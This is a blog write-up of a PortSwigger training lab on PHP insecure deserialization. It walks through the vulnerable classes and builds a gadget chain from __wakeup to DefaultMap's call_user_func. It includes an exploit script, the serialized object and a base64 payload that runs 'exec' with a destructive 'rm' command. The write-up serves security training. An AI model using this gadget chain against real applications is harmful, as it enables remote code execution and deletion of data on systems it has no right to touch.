---
layout: post
title:  "Detailed Writeup about php gadget chains"
description: Developing a custom gadget chain for PHP deserialization Portswigger lab
image: 
  path: /assets/img/blog/dese.jpg
tags: PHP
date:   2023-07-20 13:49:56 +0300
category: PHP
---
```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

### Analysis :

The `CustomTemplate` class has three properties: `$default_desc_type`, `$desc`, and `$product`. The `$default_desc_type` property is set to the value of the `$desc_type` parameter of the constructor, which defaults to 'HTML_DESC'. The `$desc` property is set to a new instance of the `Description` class. The `$product` property is not set yet.

1-The `CustomTemplate` class defines a constructor method that takes an optional `$desc_type` parameter. In the constructor, a new instance of the `Description` class is created and stored in the `$desc` property. The value of the `$default_desc_type` property is set to the value of the `$desc_type parameter`, or 'HTML_DESC' if the parameter is not provided. The `build_product()` method is called to create a new instance of the `Product` class and store it in the `$product` property.

> we can set another values for `$desc` and `$default_desc_type` because once the constructor is executed the values we provided in our injection object will set to them.
> 

2-The `CustomTemplate` class defines two magic methods: `__sleep()` and `__wakeup()`. `__sleep()` is called when the object is serialized, and it returns an array of the properties that should be serialized. In this case, it returns the `$default_desc_type` and `$desc` properties. `__wakeup()` is called when the object is unserialized, and it is used to rebuild any state that was lost during serialization. In this case, it calls the `build_product()` method to rebuild the `$product` property.

3-The Product class has one property: `$desc`. It defines a constructor method that takes a `$default_desc_type` parameter and a `$desc` parameter. In the constructor, the `$desc` property is set to the value of `$desc->$default_desc_type`. This means that the `$desc` property is set to the value of `$desc` for the key specified by `$default_desc_type`.

4-The `build_product()` method in the `CustomTemplate` class creates a new instance of the `Product` class and passes in the `$default_desc_type` and `$desc properties`. The `Product` constructor sets the `$desc` property of the new `Product` object to the value of `$desc` for the key specified by `$default_desc_type`. The `Product` object is then stored in the `$product` property of the `CustomTemplate` object.

5-So, when we create a new `CustomTemplate` object, an instance of the `Description` class is created and stored in the `$desc` property. The `$default_desc_type` property is set to the value of the `$desc_type` parameter of the constructor, or 'HTML_DESC' if the parameter is not provided. `The build_product()` method is called to create a new instance of the `Product` class and store it in the `$product` property. The Product constructor sets the `$desc` property of the new `Product` object to the value of `$desc` for the key specified by `$default_desc_type`.

6-If the `CustomTemplate` object is serialized and then unserialized, the `__wakeup()` method is called to rebuild the `$product` property using the `build_product()` method.

CONCLUSIN of `CustomTemplate` and `Product` class :

- we can control `$desc` and `$default_desc_type`
- the class have the magic method `__wakeup` and it calls `build_product()`
- `build_product()` The `build_product()` method in the `CustomTemplate` class creates a new object of the `Product` class and passes the `$default_desc_type` and `$desc properties` of the `CustomTemplate` class to the constructor of `Product`.
- The `Product` constructor sets the `$desc` property of the new `Product` object to the value of `$desc` (CustomTemplate property) for the key specified by `$default_desc_type` so The purpose of the constructor method is to set the value of the `$desc` property. It does this by accessing the value of the `$default_desc_type` parameter on the `$desc` object, and then assigning that value to the `$desc` property of the `Product` object.

Here's a breakdown of what's happening in the constructor method:

-`$this->desc` refers to the `$desc` property of the `Product` object.
-`$desc` is an object that is passed in as a parameter to the constructor.
-`$default_desc_type` is a string that is also passed in as a parameter to the constructor.
-`$desc->$default_desc_type` accesses the property of the `$desc` object that has the same name as the value of `$default_desc_type`.

We don’t need `Description` Class.

DefaultMap : 

- The code defines a class called `DefaultMap`. This class allows you to define a default behavior when trying to access non-existing properties.
- The class has a private property called `$callback`. Private properties are not directly accessible outside the class, but they can still be accessed and modified through class methods.
- The constructor of the `DefaultMap` class accepts a callback function as an argument. A callback function is a function that is passed as an argument to another function or class. In this case, the callback function will be responsible for defining the default behavior.
- The callback function provided in the constructor is assigned to the `$callback` property of the class using the `$this` keyword. The `$this` keyword is a reference to the current instance of the class.
- The `DefaultMap` class also has a magic method called `__get()`. Magic methods are special methods in PHP that are automatically called when a certain event or action occurs. In this case, the `__get()` method is called when trying to access a non-existing property of the class.
- The `__get()` method takes one argument, `$name`, which represents the name of the property that was requested but does not exist in the class.
- Inside the `__get()` method, the `call_user_func()` function is used. This function calls the callback function stored in the `$callback` property and passes the requested property name as an argument to the callback function.
- The return value of the callback function is then returned by the `__get()` method. This value will be the default behavior defined by the callback function for the requested property.
- With this `DefaultMap` class, you can create an instance and pass a callback function to define default behaviors for non-existing properties. Whenever you try to access a non-existing property on that instance, the `__get()` method will be called, and the callback function will be invoked with the requested property name, ultimately returning the default value or behavior defined by the callback function.

 `__wakeup()` magic method might be perfect as the kick-off gadge

 sink gadget is `DefaultMap` class has `call_user_func` which can execute functions if we can lead our input to this function

- During deserialization, the `__wakeup()` method is automatically called, which invokes the `build_product()` method.
- The `build_product()` method creates a new instance of the `Product` class, passing the `$default_desc_type` and `$desc` properties.
- Inside the `Product` constructor, the value of `$desc->$default_desc_type` is assigned to the `desc` property of the `Product` object.
- In this scenario, the vulnerability can be exploited by replacing the `$desc` object with an instance of the `DefaultMap` class and setting the callback function to a malicious command (e.g., `"exec"`).
- When the `build_product()` method is called, it tries to access `$default_desc_type` in the `DefaultMap` object. Since it doesn't exist, the `__get()` magic method of the `DefaultMap` class is triggered.
- The manipulated callback function is executed within the `__get()` method, allowing the execution of arbitrary code

so the exploit should be 

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct() {
        $this->desc = new DefaultMap();
        $this->default_desc_type = 'rm /home/carlos/morale.txt';
        // Carlos thought this is cool, having a function called in two places... What a genius
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}
class DefaultMap {
    private $callback;

    public function __construct($callback='exec') {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

$obj = new CustomTemplate();
$ser = serialize($obj);
echo $ser ;
?>
```

the output will be :

```php
O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:4:"exec";}}
```

it will not work , When working with serialized PHP objects, the serialized data is represented as a binary format that may include null characters. Copying and pasting the cleartext part of the serialized object can introduce encoding issues and potentially modify the content.

To accurately represent the serialized object, it's recommended to work with the binary data directly rather than copying and pasting the cleartext representation. This ensures that the serialized object is preserved without unintended modifications.

If you need to share or store the serialized object, it's best to handle it as binary data or use appropriate encoding techniques, such as base64 encoding, to avoid any data corruption during transmission or storage.

so we will add this line to the end of the script :

```php
$base64Encoded = base64_encode($ser);
echo $base64Encoded
```

the output will be: `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo0OiJleGVjIjt9fQ==`

request :

![request.png](/media/WEB_EXPLOITAION/request.png)

response: you will receive an error in the response but the lab is actually solved.

![error.png](/media/WEB_EXPLOITAION/error.png)

solved :

![solved.png](/media/WEB_EXPLOITAION//solved.png)
